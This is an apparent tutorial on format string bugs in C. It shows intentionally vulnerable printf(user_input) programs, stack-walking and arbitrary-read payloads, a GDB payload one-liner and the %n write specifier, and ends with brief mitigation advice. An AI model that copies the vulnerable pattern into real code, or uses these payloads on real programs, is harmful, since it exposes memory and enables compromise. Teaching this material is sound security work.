Format string vulnerabilities can be used to **read arbitrary memory** by exploiting the `%x`, `%s`, `%p`, or even `%n` specifiers. These specifiers allow attackers to:

* **Walk the stack** with `%x`, `%p`, or `%llx`.
* **Dereference memory** with `%s` to read from arbitrary addresses.

Here are examples demonstrating **how an attacker can use format strings to read memory**, including specific memory addresses.

---

## 🔍 **1. Reading Stack Memory Using `%x` or `%p`**

```c
#include <stdio.h>

int main() {
    int a = 0xdeadbeef;
    int b = 0xcafebabe;

    printf("Enter input: ");
    char input[256];
    fgets(input, sizeof(input), stdin);

    // ❌ Vulnerable usage
    printf(input);  // attacker controls format string

    return 0;
}
```

### 🧪 Sample Input:

```
%x %x %x %x
```

### 🧠 What Happens:

Each `%x` pops and prints a 4-byte word from the stack, leaking internal memory values, like saved return addresses or variable contents.

---

## 📖 **2. Reading Arbitrary Address Using `%s`**

```c
#include <stdio.h>

int secret = 0x41424344;  // ASCII: "ABCD"

int main() {
    printf("Secret is at: %p\n", &secret);

    char user_input[512];
    fgets(user_input, sizeof(user_input), stdin);

    // ❌ Dangerous: format string not controlled
    printf(user_input);  // `%s` will dereference a pointer

    return 0;
}
```

### 🧪 How to Exploit (from CLI with manual overwrite or scripted input):

If you control stack (e.g., via environment variables or argument offsets), use:

```
"\x10\xa0\x04\x08 %s"     // where 0x0804a010 is the address of `secret`
```

You might need to pad the format string to align with the address using dummy `%x`:

```
"AAAA %x %x %x %s"
```

Or in GDB:

```bash
(gdb) run <<< $(python -c 'print "\x10\xa0\x04\x08AAAA%x%x%x%s"')
```

---

## 🧬 **3. Controlled Address Leak with Argument Position**

Some `printf` implementations allow specifying **argument index**:

```c
printf("%8$s");  // Read 8th argument as string (char *)
```

If you can position your target address in the 8th slot, this will dereference and print it.

---

## 🧠 Summary of Exploitable Format Specifiers

| Specifier | Description                              | Exploit Use                   |
| --------- | ---------------------------------------- | ----------------------------- |
| `%x`      | Print hex from stack                     | Stack walking                 |
| `%p`      | Print pointer                            | Stack walking (more readable) |
| `%s`      | Dereference pointer                      | Arbitrary memory read         |
| `%n`      | Write number of bytes printed to address | Arbitrary memory write        |

---

## 🛡️ Mitigation

* Never pass user input directly as the format string.
* Always use format strings like:

  ```c
  printf("%s", user_input);  // SAFE
  ```


